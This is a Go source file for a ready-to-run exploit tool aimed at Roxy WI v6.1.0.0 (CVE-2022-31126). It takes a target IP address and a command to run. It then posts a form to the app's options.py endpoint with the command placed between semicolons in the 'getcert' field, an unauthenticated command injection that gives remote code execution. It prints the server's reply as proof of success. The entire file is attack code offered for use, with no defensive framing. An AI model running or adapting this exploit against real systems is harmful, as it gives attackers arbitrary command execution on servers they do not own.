package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"time"

	"github.com/akamensky/argparse"
)

func exploit(ip *string, cmd *string) bool {

	var result bool
	//append the url
	targetURL := "http://" + *ip + "/app/options.py"

	//prepare the response body
	data := map[string]string{
		"show_versions":  "1",
		"token":          "",
		"alert_consumer": "1",
		"serv":           "127.0.0.1",
		"getcert":        ";" + *cmd + ";",
	}

	formData := url.Values{}

	for key, value := range data {
		formData.Set(key, value)
	}

	resp, err := http.PostForm(targetURL, formData)
	if err != nil {
		fmt.Println("Error sending POST request:", err)
		return false
	}
	defer resp.Body.Close()

	// Check the response status code
	fmt.Println("Response Status:", resp.Status)
	if resp.StatusCode == 200 {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}
		bodyString := string(body)
		fmt.Println(bodyString)
		result = true
	} else {
		result = false
	}
	return result
}

func main() {
	// Create new parser object
	parser := argparse.NewParser("cve2022-31126", "Roxy WI v6.1.0.0 - Unauthenticated Remote Code Execution (RCE)")
	var ip *string = parser.String("i", "ip", &argparse.Options{Required: true, Help: "IP address of the CMS"})
	var cmd *string = parser.String("c", "cmd", &argparse.Options{Required: true, Help: "Command to execute"})
	// Parse input
	err := parser.Parse(os.Args)
	if err != nil {
		// In case of error print error and print usage
		// This can also be done by passing -h or --help flags
		fmt.Print(parser.Usage(err))
	}

	/// Grab the IPv4 regex
	ipv4_regex := `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`
	match, _ := regexp.MatchString(ipv4_regex, *ip)

	if match {
		fmt.Println("Running exploit against " + *ip + " , running command" + *cmd)
		time.Sleep(600)
		var exploitSuccess bool = exploit(ip, cmd)
		if exploitSuccess == true {
			fmt.Println("Exploit successful!")
		} else {
			fmt.Println("Exploit failed...maybe try again?")
		}
	}
}
